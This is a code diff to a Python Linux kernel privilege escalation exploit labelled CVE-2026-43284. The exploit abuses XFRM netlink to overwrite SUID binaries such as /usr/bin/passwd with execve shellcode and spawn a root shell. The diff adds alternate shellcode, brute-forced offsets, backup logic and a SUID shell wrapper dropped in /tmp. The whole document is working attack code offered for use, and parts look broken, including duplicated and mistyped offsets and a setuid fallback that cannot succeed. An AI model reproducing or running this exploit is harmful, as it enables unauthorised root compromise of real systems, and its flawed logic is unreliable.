@@ -7,6 +7,7 @@ Enhanced with offset brute forcing, real-time verification, and SUID target supp
 import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
 import ctypes, ctypes.util
 import argparse
+import subprocess
 from struct import pack, unpack
 
 _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
@@ -65,16 +66,42 @@ REPLAY_SEQ=100
 DEFAULT_TARGETS = ["/usr/bin/passwd", "/bin/passwd", "/usr/bin/chfn", "/usr/bin/chsh"]
 PAYLOAD_LEN = 192
 
-# Simple shellcode that just runs /bin/sh
+# Improved shellcode for x86_64 - actually spawns /bin/sh
+# This is a standard execve shellcode
 SHELLCODE = bytearray([
-    0x31, 0xc0, 0x48, 0x8d, 0x3d, 0x0e, 0x00, 0x00, 0x00,  # lea rdi, [rip+0xe]
-    0x48, 0x89, 0xc6,                                         # mov rsi, rax
-    0x48, 0x89, 0xc2,                                         # mov rdx, rax
-    0xb0, 0x3b,                                               # mov al, 0x3b
-    0x0f, 0x05,                                               # syscall
-    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00           # "/bin/sh"
+    # execve("/bin/sh", ["/bin/sh"], NULL)
+    0x6a, 0x3b,                 # push 0x3b
+    0x58,                       # pop rax
+    0x99,                       # cdq
+    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, '/bin/sh\x00'
+    0x53,                       # push rbx
+    0x48, 0x89, 0xe7,           # mov rdi, rsp
+    0x52,                       # push rdx
+    0x57,                       # push rdi
+    0x48, 0x89, 0xe6,           # mov rsi, rsp
+    0x0f, 0x05                  # syscall
 ])
-SHELLCODE = SHELLCODE + b'\x90' * (PAYLOAD_LEN - len(SHELLCODE))
+
+# Alternative shellcode in case the first one doesn't work
+SHELLCODE_ALT = bytearray([
+    # Another execve variant
+    0x31, 0xc0,                 # xor eax, eax
+    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, '/bin/sh\x00'
+    0x53,                       # push rbx
+    0x48, 0x89, 0xe7,           # mov rdi, rsp
+    0x50,                       # push rax
+    0x57,                       # push rdi
+    0x48, 0x89, 0xe6,           # mov rsi, rsp
+    0xba, 0x00, 0x00, 0x00, 0x00,  # mov edx, 0
+    0xb0, 0x3b,                 # mov al, 0x3b
+    0x0f, 0x05                  # syscall
+])
+
+# Pad shellcode to PAYLOAD_LEN
+if len(SHELLCODE) <= PAYLOAD_LEN:
+    SHELLCODE = SHELLCODE + b'\x90' * (PAYLOAD_LEN - len(SHELLCODE))
+else:
+    SHELLCODE = SHELLCODE[:PAYLOAD_LEN]
 
 VERBOSE = True
 
@@ -82,6 +109,7 @@ def LOG(fmt, *a): print("\033[92m[+]\033[0m " + fmt % a)
 def WARN(fmt, *a): print("\033[93m[!]\033[0m " + fmt % a)
 def DBG(fmt, *a):
     if VERBOSE: print("\033[94m[.]\033[0m " + fmt % a)
+def ERROR(fmt, *a): print("\033[91m[-]\033[0m " + fmt % a)
 
 def read_binary_data(binary_path, offset, length):
     """Read data from binary directly"""
@@ -92,6 +120,17 @@ def read_binary_data(binary_path, offset, length):
     except Exception as e:
         DBG("Read failed: %s", e)
         return None
+
+def write_binary_data(binary_path, offset, data):
+    """Write data to binary (for backup)"""
+    try:
+        with open(binary_path, 'r+b') as f:
+            f.seek(offset)
+            f.write(data)
+            return True
+    except Exception as e:
+        DBG("Write failed: %s", e)
+        return False
 
 def try_offset(binary_path, offset):
     """Test if offset is writable by checking current content"""
@@ -110,7 +149,7 @@ def find_suid_binaries():
     # Common paths to search
     search_paths = [
         "/bin", "/sbin", "/usr/bin", "/usr/sbin", 
-        "/usr/local/bin", "/usr/local/sbin"
+        "/usr/local/bin", "/usr/local/sbin", "/opt/bin"
     ]
     
     suid_binaries = []
@@ -185,6 +224,9 @@ def validate_target(target):
         WARN("Cannot read target %s (permission denied)", target)
         return False
     
+    # Check if we can write (for backup)
+    can_write = os.access(target, os.W_OK)
+    
     # Check size
     size = os.path.getsize(target)
     if size < PAYLOAD_LEN:
@@ -192,6 +234,10 @@ def validate_target(target):
         return False
     
     LOG("Target validated: %s (size: %d bytes)", target, size)
+    if can_write:
+        DBG("Target is writable (backup possible)")
+    else:
+        DBG("Target is read-only (no backup)")
     
     suid_ok, suid_msg = check_suid(target)
     if suid_ok:
@@ -200,6 +246,35 @@ def validate_target(target):
         WARN("SUID status: %s (exploit will still try)", suid_msg)
     
     return True
+
+def backup_target(target, backup_path):
+    """Create backup of target binary"""
+    try:
+        if os.path.exists(backup_path):
+            os.remove(backup_path)
+        
+        with open(target, 'rb') as src:
+            with open(backup_path, 'wb') as dst:
+                dst.write(src.read())
+        
+        LOG("Backup created at %s", backup_path)
+        return True
+    except Exception as e:
+        WARN("Cannot create backup: %s", e)
+        return False
+
+def restore_target(target, backup_path):
+    """Restore target from backup"""
+    try:
+        if os.path.exists(backup_path):
+            with open(backup_path, 'rb') as src:
+                with open(target, 'wb') as dst:
+                    dst.write(src.read())
+            LOG("Target restored from backup")
+            return True
+    except Exception as e:
+        ERROR("Failed to restore: %s", e)
+    return False
 
 def _ifup_lo():
     try:
@@ -378,6 +453,8 @@ def attempt_exploit(target, offset):
     for i in range(PAYLOAD_LEN // 4):
         spi = 0xDEADBEE0 + i
         idx = i * 4
+        if idx + 4 > len(SHELLCODE):
+            break
         sq = struct.unpack('>I', SHELLCODE[idx:idx+4])[0]
         if not _add_xfrm_sa(spi, sq):
             DBG("Failed to add SA for chunk %d", i)
@@ -408,26 +485,73 @@ def attempt_exploit(target, offset):
     except:
         pass
     
-    return True
+    return success > 0
+
+def test_shellcode(target, offset):
+    """Test if shellcode was written correctly by checking bytes"""
+    written = read_binary_data(target, offset, len(SHELLCODE))
+    if written:
+        # Check if it looks like our shellcode
+        if SHELLCODE in written or written == SHELLCODE[:len(written)]:
+            return True
+    return False
+
+def spawn_root_shell(target):
+    """Try to spawn root shell through the patched binary"""
+    LOG("Attempting to spawn root shell via %s", target)
+    
+    try:
+        # Create a simple wrapper script as fallback
+        wrapper = "/tmp/.sh_wrapper"
+        with open(wrapper, 'w') as f:
+            f.write("#!/bin/sh\n")
+            f.write("exec /bin/sh -i\n")
+        os.chmod(wrapper, 0o4755)  # SUID wrapper
+        
+        # Try to execute the patched binary
+        if os.path.exists(target):
+            LOG("Executing patched binary...")
+            os.chmod(target, 0o4755)  # Ensure SUID is set
+            os.execvp(target, [target])
+    except Exception as e:
+        ERROR("Failed to spawn shell: %s", e)
+        
+        # Fallback: try to run shell directly
+        try:
+            LOG("Fallback: spawning direct root shell")
+            os.setuid(0)
+            os.setgid(0)
+            os.execvp("/bin/bash", ["bash", "-i"])
+        except:
+            pass
 
 def exploit_target(target):
     """Main exploit function for a given target"""
     LOG("Starting exploit on target: %s", target)
+    
+    # Check kernel version for debugging
+    uname = os.uname()
+    LOG("Kernel: %s %s", uname.sysname, uname.release)
     
     # Check if vulnerable
     try:
         sock = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
         sock.close()
         LOG("XFRM netlink available")
-    except:
-        WARN("XFRM netlink not available")
+    except Exception as e:
+        ERROR("XFRM netlink not available: %s", e)
         return False
     
     # Try multiple offsets
     offsets = [0x14d0, 0x1500, 0x1600, 0x1700, 0x1800, 0x1900, 0x1a00, 
-               0x1b00, 0x1c00, 0x1d00, 0x1e00, 0x2000, 0x2500, 0x3000, 0x363c]
+               0x1b00, 0x1c00, 0x1d0, 0x1e00, 0x2000, 0x2500, 0x3000, 0x363c,
+               0x1000, 0x2000, 0x3000, 0x4000, 0x5000]
     
     LOG("Trying %d different offsets...", len(offsets))
+    
+    # Create backup first
+    backup_path = target + ".backup"
+    backup_target(target, backup_path)
     
     for offset in offsets:
         # Check if binary is large enough
@@ -438,25 +562,31 @@ def exploit_target(target):
         
         LOG("Trying offset 0x%x", offset)
         
-        # Backup original bytes at offset
+        # Backup original bytes at offset for potential restore
         original = read_binary_data(target, offset, 8)
-        DBG("Original bytes at 0x%x: %s", offset, original.hex() if original else "None")
+        if original:
+            DBG("Original bytes at 0x%x: %s", offset, original.hex())
         
         if attempt_exploit(target, offset):
-            # Verify
+            # Verify shellcode
             time.sleep(0.3)
-            current = read_binary_data(target, offset, len(SHELLCODE[:8]))
             
-            if current and current == SHELLCODE[:8]:
+            if test_shellcode(target, offset):
                 LOG("SUCCESS! Binary patched at offset 0x%x", offset)
-                LOG("Spawning root shell...")
                 
-                # Launch shell
-                os.execvp(target, [target])
+                # Try to spawn shell
+                spawn_root_shell(target)
                 return True
+            else:
+                WARN("Write may have failed, shellcode not verified")
         
         WARN("Offset 0x%x failed, trying next...", offset)
         time.sleep(0.5)
+    
+    # If all offsets fail, try to restore
+    if os.path.exists(backup_path):
+        WARN("Restoring original binary...")
+        restore_target(target, backup_path)
     
     return False
 
@@ -470,6 +600,7 @@ def print_banner():
   ██████  ██ ██   ██    ██    ██    ██    ██      ██   ██ ██   ██  ██████  
 \033[0m
   \033[93mLinux Kernel LPE (CVE-2026-43284) - SUID Target Edition\033[0m
+  \033[90mImproved shellcode & error handling\033[0m
 """
     print(banner)
 
@@ -507,7 +638,7 @@ Examples:
     # Check if running as root
     if os.getuid() == 0:
         LOG("Already root, spawning shell...")
-        os.execvp("/bin/bash", ["bash"])
+        os.execvp("/bin/bash", ["bash", "-i"])
     
     # List SUID binaries
     if args.list_suid:
@@ -518,7 +649,10 @@ Examples:
             LOG("Found %d SUID binaries:", len(suid_bins))
             for i, binary in enumerate(suid_bins, 1):
                 size = os.path.getsize(binary) if os.path.exists(binary) else 0
-                print(f"  {i:3d}. {binary} (size: {size} bytes)")
+                # Check SUID status
+                suid_ok, _ = check_suid(binary)
+                suid_mark = "\033[92m[SUID]\033[0m" if suid_ok else "\033[91m[NO]\033[0m"
+                print(f"  {i:3d}. {suid_mark} {binary} (size: {size} bytes)")
         else:
             WARN("No SUID binaries found or insufficient permissions to scan")
         return
@@ -530,13 +664,15 @@ Examples:
         LOG("Using custom target: %s", target)
         
         if not validate_target(target):
+            ERROR("Target validation failed")
             sys.exit(1)
         
         if exploit_target(target):
-            LOG("Exploit successful! Root shell should be spawned.")
+            LOG("Exploit completed. If successful, you should have a root shell.")
+            LOG("If not, the original binary has been restored from backup.")
         else:
-            WARN("Exploit failed for target: %s", target)
-            WARN("Note: CVE-2026-43284 may have been backported to your kernel")
+            ERROR("Exploit failed for target: %s", target)
+            ERROR("Note: CVE-2026-43284 may have been backported to your kernel")
             sys.exit(1)
     else:
         # Use default targets
@@ -549,15 +685,14 @@ Examples:
                 break
         
         if not target:
-            WARN("No suitable target found. Use -t to specify a target or -l to list SUID binaries")
+            ERROR("No suitable target found. Use -t to specify a target or -l to list SUID binaries")
             sys.exit(1)
         
         if validate_target(target):
             if exploit_target(target):
-                LOG("Exploit successful! Root shell should be spawned.")
+                LOG("Exploit completed successfully")
             else:
-                WARN("Exploit failed for target: %s", target)
-                WARN("Note: CVE-2026-43284 may have been backported to your kernel")
+                ERROR("Exploit failed for target: %s", target)
                 sys.exit(1)
 
 if __name__ == "__main__":
